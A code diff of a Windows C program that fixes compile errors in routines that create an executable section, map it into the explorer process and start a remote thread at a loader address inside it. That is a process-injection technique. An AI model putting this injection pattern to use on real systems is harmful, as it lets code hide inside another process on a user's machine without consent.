@@ -68,7 +68,7 @@ HANDLE create_sheep_section(void) {
    assert(sheep_monitor_file != INVALID_HANDLE_VALUE);
 
    HANDLE sheep_section;
-   assert(NtCreateSection(&section,
+   assert(NtCreateSection(&sheep_section,
                           SECTION_MAP_EXECUTE,
                           NULL,
                           0,
@@ -125,7 +125,7 @@ int main(int argc, char *argv[]) {
 
       char filename[MAX_PATH+1];
       memset(&filename[0], 0, MAX_PATH+1);
-      DWORD filename_size = GetModuleFileNameExA(proc, nullptr, &filename[0], MAX_PATH);
+      DWORD filename_size = GetModuleFileNameExA(proc, NULL, &filename[0], MAX_PATH);
 
       size_t j;
       
@@ -150,10 +150,10 @@ int main(int argc, char *argv[]) {
    PIMAGE_NT_HEADERS64 sheep_nt = get_nt_headers(&SHEEP_MONITOR[0]);
    HANDLE sheep_section = create_sheep_section();
    uintptr_t remote_sheep_base = 0;
-   size_t remote_sheep_size = 0;
+   ULONG remote_sheep_size = 0;
    assert(NtMapViewOfSection(sheep_section,
                              explorer_proc,
-                             &remote_sheep_base,
+                             (PVOID *)&remote_sheep_base,
                              0,
                              0,
                              NULL,
@@ -180,7 +180,7 @@ int main(int argc, char *argv[]) {
                                                     NULL,
                                                     8192,
                                                     (LPTHREAD_START_ROUTINE)(remote_sheep_base+loader_rva),
-                                                    config_base,
+                                                    (LPVOID)config_base,
                                                     0,
                                                     &loader_id);
    assert(remote_thread_handle != NULL);
